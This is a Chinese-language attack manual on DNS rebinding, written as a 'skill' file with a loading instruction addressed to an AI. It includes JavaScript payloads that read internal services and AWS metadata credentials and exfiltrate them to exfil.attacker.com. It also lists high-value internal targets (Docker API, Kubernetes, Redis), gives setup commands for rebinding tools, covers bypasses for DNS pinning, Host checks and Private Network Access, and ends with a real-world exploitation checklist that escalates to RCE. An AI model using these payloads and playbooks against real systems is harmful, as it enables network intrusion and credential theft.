# 技能：DNS重绑定 — 专家攻击手册

> **AI加载指令**：通过DNS操控绕过同源策略的专家级DNS重绑定技术。涵盖TTL技巧、浏览器缓存绕过、攻击变种（HTTP、WebSocket、TOCTOU）、内部服务目标以及工具使用。基础模型将DNS重绑定与SSRF混淆 — 本技能阐明其客户端特性及独特的利用路径。

## 0. 相关路由

- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) — 服务器端变种；DNS重绑定是**客户端**对应方案
- [cors-cross-origin-misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) — 当CORS配置错误允许直接跨域读取时

---

## 1. 核心原理

浏览器同源策略绑定`协议 + 主机 + 端口`。**主机**在连接时通过DNS解析。若攻击者控制`attacker.com`的DNS服务器，他们可以：

1. 首次解析 → 攻击者IP（提供恶意JS）
2. 第二次解析 → 内部IP（受害者网络）
3. 浏览器认为两个响应同源（`attacker.com`）
4. 恶意JS读取内部服务响应

```
受害者访问attacker.com
        │
        ▼
DNS查询：attacker.com → 1.2.3.4（攻击者服务器）
浏览器从1.2.3.4加载恶意JS
        │
        ▼
TTL过期（或强制刷新）
        │
        ▼
JS触发对attacker.com的新请求
DNS查询：attacker.com → 192.168.1.1（内部目标）
浏览器以"attacker.com"原点发送请求到192.168.1.1
        │
        ▼
JS读取响应 — 同源策略满足
向攻击者其他端点窃取数据
```

**关键洞察**：SOP检查主机名字符串，而非解析后的IP。DNS可以改变同一主机名下的IP。

---

## 2. TTL操控

### DNS服务器配置

攻击者运行其域名的权威DNS服务器，交替响应：

| 查询序号 | 响应 | TTL |
|---|---|---|
| 第1次 | 攻击者IP（如`1.2.3.4`） | 0 |
| 第2次+ | 目标内部IP（如`192.168.1.1`） | 0 |

TTL=0告诉解析器不要缓存结果，强制下次连接重新解析。

### 浏览器DNS缓存现实

浏览器维护自己的DNS缓存，**忽略低TTL**：

| 浏览器 | 内部DNS缓存 | 绕过技巧 |
|---|---|---|
| Chrome | 约60秒最小 | 等待60秒；或使用多个子域名 |
| Firefox | 约60秒（network.dnsCacheExpiration） | 在about:config中可调整 |
| Safari | 约变化 | 通常缓存较短 |
| Edge（Chromium） | 与Chrome相同（约60s） | 与Chrome相同技巧 |

### 绕过策略

```
1. 多个A记录技巧：
   - 在单个DNS响应中返回攻击者IP和目标IP
   - 浏览器尝试首个IP；若连接失败 → 回退到第二个
   - 在初始页面加载后阻止攻击者IP → 强制回退到内部IP
   
2. 子域名洪泛：
   - 使用唯一子域名：a1.rebind.attacker.com, a2.rebind.attacker.com...
   - 每个子域名获得新鲜DNS解析（无缓存命中）
   
3. Service worker刷新：
   - 注册拦截并延迟请求的service worker
   - 到fetch执行时，DNS缓存已过期
```

---

## 3. 攻击变种

### 3.1 经典HTTP重绑定

目标：内部Web服务（管理面板、REST API）

```javascript
// 从attacker.com（首次DNS解析→攻击者IP）提供
async function exploit() {
    // 等待DNS缓存过期
    await sleep(65000); // >60s for Chrome
    
    // 此请求现在解析到内部IP
    const resp = await fetch('http://attacker.com:8080/api/admin/users');
    const data = await resp.text();
    
    // 窃取到攻击者其他端点
    navigator.sendBeacon('https://exfil.attacker.com/log', data);
}
```

### 3.2 WebSocket重绑定

WebSocket连接在DNS重绑定后仍保持。建立WebSocket，然后重绑定：

```javascript
// 重绑定后，WebSocket连接到内部服务
const ws = new WebSocket('ws://attacker.com:9090/ws');
ws.onopen = () => {
    ws.send('{"action":"dump_config"}');
};
ws.onmessage = (e) => {
    fetch('https://exfil.attacker.com/ws-data', {
        method: 'POST',
        body: e.data
    });
};
```

### 3.3 检查时到使用时的时间（TOCTOU）

服务器端应用程序在请求时验证DNS，但重用连接：

```
1. 应用程序接收URL：http://attacker.com/callback
2. 服务器解析attacker.com → 1.2.3.4（公共IP）→ 通过验证
3. 服务器打开连接/跟随重定向
4. DNS变更：attacker.com → 169.254.169.254
5. 连接重用或重定向命中内部IP
```

这是与SSRF的混合 — 重绑定发生在服务器的解析器中。

### 3.4 多个A记录（最快变种）

```
attacker.com的DNS响应：
  A  1.2.3.4       （攻击者 — 提供JS）
  A  192.168.1.1   （目标 — 内部服务）
  
1. 浏览器连接到1.2.3.4，加载带JS的页面
2. 攻击者防火墙阻止受害者进一步连接到1.2.3.4
3. JS对attacker.com发起新请求
4. 浏览器尝试1.2.3.4 → 连接拒绝
5. 回退到192.168.1.1 → 仍同源
6. JS可读取响应
```

---

## 4. 高价值目标

| 目标 | 端口 | 原因 |
|---|---|---|
| 云元数据 | `169.254.169.254:80` | AWS/GCP/Azure实例凭证、令牌 |
| Docker API | `172.17.0.1:2375` | 容器创建、主机文件系统挂载 → RCE |
| Kubernetes API | `10.96.0.1:443/6443` | Pod创建、密钥读取 |
| 内部管理面板 | 各种 | 路由器配置、NAS、打印机、SCADA |
| IoT设备 | `192.168.x.x:80/443` | 摄像头流、智能家居控制 |
| Elasticsearch | `*:9200` | 数据窃取、索引操作 |
| Redis | `*:6379` | 数据读取、RCE的配置设置 |
| Consul/etcd | `*:8500/2379` | 服务发现、密钥存储 |

### 云元数据特定

```javascript
// AWS元数据通过重绑定
fetch('http://attacker.com/latest/meta-data/iam/security-credentials/')
    .then(r => r.text())
    .then(role => {
        return fetch(`http://attacker.com/latest/meta-data/iam/security-credentials/${role}`);
    })
    .then(r => r.json())
    .then(creds => {
        navigator.sendBeacon('https://exfil.attacker.com/', JSON.stringify(creds));
    });
// 重绑定后，attacker.com解析到169.254.169.254
// 浏览器发送Host: attacker.com但IMDSv1不检查Host头
```

**IMDSv2防御**：需要PUT请求的`X-aws-ec2-metadata-token`头。重绑定无法在`no-cors`模式下轻松设置初始令牌的自定义头。

---

## 5. 工具

| 工具 | 目的 | URL |
|---|---|---|
| **Singularity** | 完整DNS重绑定攻击框架 | github.com/nccgroup/singularity |
| **rbndr.us** | 快速重绑定DNS服务（子域中的IP对） | rbndr.us |
| **whonow** | 动态DNS重绑定服务器 | github.com/taviso/whonow |
| **dnsrebinder** | 用于重绑定的最小Python DNS服务器 | 自定义 / 各个仓库 |

### Singularity快速启动

```bash
# 克隆并运行
git clone https://github.com/nccgroup/singularity
cd singularity
go build -o singularity cmd/singularity-server/main.go

# 使用攻击者IP到目标IP的重绑定启动
./singularity -DNSRebindStrategy round-robin \
    -ResponseIPAddr 1.2.3.4 \
    -RebindingFn sequential \
    -ResponseReboundIPAddr 192.168.1.1
```

### rbndr.us（零配置）

```
格式：<十六进制IP1>.<十六进制IP2>.rbndr.us
示例：7f000001.c0a80101.rbndr.us
  → 在127.0.0.1和192.168.1.1之间交替
  
将IP转换为十六进制：
  192.168.1.1 → c0.a8.01.01 → c0a80101
  127.0.0.1   → 7f.00.00.01 → 7f000001
```

---

## 6. DNS重绑定 vs. SSRF

| 方面 | DNS重绑定 | SSRF |
|---|---|---|
| 执行上下文 | 客户端（浏览器） | 服务器端 |
| 原点绕过 | 同源策略 | 网络访问控制 |
| 攻击者控制 | DNS解析 | 服务器发送的URL/请求 |
| 需要 | 受害者访问攻击者页面 | 漏洞的服务器端获取 |
| 内部访问通过 | 受害者网络上的浏览器 | 服务器的网络位置 |
| 凭证包含 | 浏览器自动发送cookie → 若同站允许则有效 | 无用户凭证 |
| 协议支持 | HTTP/WS（浏览器限制） | 任何协议（gopher、file等） |

**关键区别**：DNS重绑定利用**受害者的浏览器**作为支点，因此它访问受害者网络上可见的服务，并带有**受害者的cookie/凭证**。

---

## 7. 防御和防御绕过

### 常见防御

| 防御 | 工作原理 |
|---|---|
| DNS固定 | 浏览器/解析器缓存DNS并拒绝重新解析 |
| Host头验证 | 服务器拒绝带有意外Host头的请求 |
| 网络分段 | 浏览器网络无法访问内部服务 |
| 私有网络访问（PNA） | Chrome的提议：对私有IP请求的预检 |
| 内部服务认证 | 内部服务需要认证，而不仅仅是网络访问 |

### 防御绕过技巧

```
DNS固定绕过：
├── 多个A记录 → 连接失败强制回退
├── 每次请求的子域名 → 无缓存命中
├── 等待缓存过期（Chrome: 60s）
└── 通过CNAME链重绑定（更难固定）

Host头验证绕过：
├── 内部服务可能根本不检查Host头
├── Host: attacker.com被默认配置接受
├── 基于IP的虚拟主机不检查Host
└── 通配符虚拟主机配置

私有网络访问（PNA）绕过：
├── PNA仅在Chrome中（截至2024年），部分执行
├── WebSocket连接可能不会触发预检
├── HTTPS → HTTP降级场景
└── 非浏览器客户端不受影响
```

---

## 8. 决策树

```
想从受害者的浏览器访问内部服务？
│
├── 能否让受害者访问你的页面？
│   ├── 是 → DNS重绑定可行
│   │   │
│   │   ├── 目标是什么？
│   │   │   ├── HTTP服务 → 经典重绑定（第3.1节）
│   │   │   ├── WebSocket服务 → WebSocket重绑定（第3.2节）
│   │   │   └── 云元数据 → 元数据窃取（第4节）
│   │   │
│   │   ├── 浏览器缓存问题？
│   │   │   ├── Chrome → 等待60s或使用多个子域名
│   │   │   ├── Firefox → 等待60s或调整dnsCacheExpiration
│   │   │   └── 使用多个A记录技巧实现即时重绑定
│   │   │
│   │   ├── 目标检查Host头？
│   │   │   ├── 是 → 单独重绑定无效
│   │   │   │   └── 检查是否存在SSRF（../ssrf-server-side-request-forgery/）
│   │   │   └── 否 → 继续重绑定
│   │   │
│   │   └── 需要凭证？
│   │       ├── 浏览器自动发送cookies → 若同站允许则有效
│   │       └── 需要自定义认证头 → 有限（no-cors不会发送自定义头）
│   │
│   └── 否 → DNS重绑定不适用
│       └── 若存在服务器端获取，考虑SSRF
│
└── 这是服务器端DNS验证绕过吗？（TOCTOU）
    ├── 是 → 混合方法（第3.3节）
    │   └── 带DNS重绑定的SSRF用于IP验证绕过
    └── 否 → 查看../ssrf-server-side-request-forgery/替代方案
```

---

## 9. 真实世界利用检查清单

```
□ 设置DNS重绑定基础设施（Singularity / rbndr.us / 自定义）
□ 从受害者上下文识别目标内部服务（如果可能进行受害者端口扫描）
□ 确定目标浏览器的DNS缓存持续时间
□ 选择重绑定变体（经典 / 多A记录 / 子域名洪泛）
□ 首先使用良性内部端点测试（例如路由器上的/）
□ 验证重绑定后同源读取是否工作
□ 升级：云元数据 → 凭证，Docker API → RCE，管理面板 → 配置
□ 记录：attacker.com DNS配置、JS负载、重绑定时间、窃取数据
```
